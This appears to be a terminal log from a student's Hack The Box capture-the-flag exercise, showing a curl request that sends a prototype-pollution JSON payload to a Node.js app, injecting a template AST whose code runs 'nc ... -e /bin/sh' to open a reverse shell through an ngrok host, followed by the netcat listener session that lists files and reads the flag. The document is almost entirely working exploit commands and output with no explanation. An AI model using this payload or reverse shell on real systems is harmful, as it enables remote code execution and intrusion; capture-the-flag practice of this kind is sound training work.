
```sh
╭─zoey@virtual-parrot ~/class/cnit127/207 
╰─$ curl 'http://docker.hackthebox.eu:32142/api/submit' \
  -H 'Content-Type: application/json' \
  --data "{\"__proto__.type\":\"Program\",\"__proto__.body\":[{\"type\":\"MustacheStatement\",\"path\":0,\"params\":[{\"type\":\"NumberLiteral\",\"value\":\"process.mainModule.require('child_process').execSync(\\\"nc 0.tcp.ngrok.io 12599 -e /bin/sh \\\")\"}],\"loc\":{\"start\":0,\"end\":0}}],\"artist\":{\"name\":\"Haigh\"}}"
```


```js
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ nc -lvp 22473
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::22473
Ncat: Listening on 0.0.0.0:22473
Ncat: Connection from ::1.
Ncat: Connection from ::1:35044.
ls
flagYoqSW
index.js
node_modules
package.json
routes
static
views
yarn.lock
cat flagYoqSW
HTB{wh3n_l1f3_g1v3s_y0u_p6_st4rt_p0llut1ng_w1th_styl3}
```